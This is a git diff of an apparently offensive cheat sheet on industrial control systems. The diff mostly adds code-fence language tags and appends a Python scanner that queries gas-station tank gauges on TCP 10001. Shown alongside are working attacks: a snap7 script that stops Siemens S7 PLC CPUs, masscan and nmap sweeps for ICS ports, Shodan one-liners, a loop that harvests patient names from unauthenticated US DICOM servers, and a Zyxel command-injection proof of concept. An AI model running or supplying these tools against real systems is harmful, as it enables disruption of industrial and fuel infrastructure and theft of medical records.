@@ -2,7 +2,7 @@
 
 ## General Enumeration:
 
-```
+```bash
 nmap -Pn -sT --scan-delay 1s --max-parallelism 1 \
     -p
     80,102,443,502,530,593,789,1089-1091,1911,1962,2222,2404,4000,4840,4843,4911,9600,19999,20000,20547,34962-34964,34980,44818,46823,46824,55000-55003 \
@@ -15,13 +15,13 @@ Enumerates Siemens S7 PLC Devices and collects their device information. This sc
 
 Usage:
 
-```
+```bash
 nmap --script s7-info.nse -p 102 <host/s>
 ```
 
 Output:
 
-```
+```bash
 102/tcp open  Siemens S7 PLC
 | s7-info:
 |   Basic Hardware: 6ES7 315-2AG10-0AB0
@@ -35,13 +35,13 @@ Output:
 
 For scalable scanning and reconnaissance, utilize masscan for faster enumeration:
 
-```
+```bash
 masscan <IP Range> -p 102 -oL Possible_ICS.txt; cat Possible_ICS.txt | while read LINE; do nmap --script s7-info.nse -p 102 $(awk '{print $4}'); done
 ```
 
 ## Stopping S7 CPUs with Python:
 
-```
+```python
 import snap7
 
 client = snap7.client.Client()
@@ -55,7 +55,7 @@ if cpu_state == "S7CpuStatusRun":
 
 ## Modbus Scanning
 
-```
+```bash
 nmap -Pn -sT -p502 --script modbus-discover <target>
 
 nmap -sT -Pn -p502 --script modbus-discover --script-args modbus-discover.aggressive=true <target>
@@ -65,7 +65,7 @@ nmap -sT -Pn -p502 --script modbus-discover --script-args modbus-discover.aggres
 
 ## Bacnet
 
-```
+```bash
 nmap -Pn -sU -p47808 --script bacnet-info <target>
 
 # Siemens Bacnet P2 Enumeration 
@@ -105,7 +105,7 @@ PCWorx devices allow unaunthenticated requests that query for system information
 
 Shodan one-liner for enumerating Siemens PLCs, SCADA software, and HMI web pages
 
-```
+```bash
 root@RoseSecurity:~# shodan search --fields ip_str,port siemens > Siemens.txt; echo "$(cat Siemens.txt | awk '{if ($2 == "80" || $2 == "443") {print $1;} }')" > Siemens.txt; eyewitness -f Siemens.txt
 ```
 
@@ -234,7 +234,7 @@ http.favicon.hash:-1250474341
 
 Count patient names in US exposed DICOM medical servers with no authentication
 
-```
+```bash
 $ shodan download search "tag:medical" "country:us"; shodan parse --fields ip_str search.json.gz > usa_dicom_ip ; for i in `cat usa_dicom_ip` ; do echo "///// Now connecting to $i ////" ; findscu -v -to 1 -P -k PatientName="*" $i 104 >> us_dicom_patient_names; wc -l us_dicom_patient_names ; done
 ```
 ## Zyxel Firewall Unauthenticated Remote Command Injection
@@ -255,14 +255,14 @@ poc:http://<IP>/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id
 
 1. Determine your home IP or target of interest's IP address
 
-```
+```bash
 root@RoseSecurity# shodan myip
 69.69.69.69
 ```
 
 2. Create network alert
 
-```
+```bash
 root@RoseSecurity# shodan create home 69.69.69.69
 Successfully created network alert!
 Alert ID: 34W09AETJKAHEDPX
@@ -270,7 +270,7 @@ Alert ID: 34W09AETJKAHEDPX
 
 3. Confirm that alert is generated
 
-```
+```bash
 root@RoseSecurity# shodan alert info home 
 home
 Created: 2022-03-01:69:69:69000
@@ -284,7 +284,7 @@ Triggers:
 
 4. Turn on notification
 
-```
+```bash
 root@RoseSecurity# shodan alert enable 34W09AETJKAHEDPX any
 Successfully enabled Trigger: any
 ```
@@ -293,7 +293,7 @@ Successfully enabled Trigger: any
 
 Python script to search for common ICS file extensions
 
-```
+```python
 # Author: selmux
 import os
 
@@ -392,4 +392,36 @@ for root, dirs, files in os.walk(ics_path):
         if file.endswith(ics_ext):
              print(os.path.join(root, file))
              
+```
+
+## Automated Tank Gauge (ATG) Remote Configuration Disclosure:
+
+In 2015, HD Moore, the creator of Metasploit, published an article disclosing over 5,800 gas station Automated Tank Gauges (ATGs) which were publicly accessible. Besides monitoring for leakage, these systems are also instrumental in gauging fluid levels, tank temperature, and can alert operators when tank volumes are too high or have reached a critical low. ATGs are utilized by nearly every fueling station in the United States and tens of thousands of systems internationally. They are most commonly manufactured by Veeder-Root, a supplier of fuel dispensers, payment systems, and forecourt merchandising. For remote monitoring of these fuel systems, operators will commonly configure the ATG serial interface to an internet-facing TCP port (generally set to TCP 10001). This script reads the Get In-Tank Inventory Report from TCP/10001 as a proof of concept to demonstrate the arbitrary access.
+
+```python
+#!/usr/bin/env python3
+
+ 
+import time
+import socket            
+with open("/tmp/ATG_SCAN.txt",'r') as atg_file:
+    for line in atg_file.read().splitlines():
+        try:
+            atg_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            port = 10001
+            search_str = 'IN-TANK INVENTORY'               
+            msg = str('\x01' + 'I20100' + '\n').encode('ascii')
+            atg_socket.connect((line, port))
+            atg_socket.send(msg)
+            time.sleep(.25)
+            response = atg_socket.recv(1024).decode()
+            if search_str in response:
+                with open("/tmp/ATG_DEVICES.txt", 'a') as file2:
+                    file2.write(line + "\t ->\tATG Device\n")
+            else:
+                continue
+            atg_socket.close()   
+        except:
+            pass 
+atg_file.close()
 ```
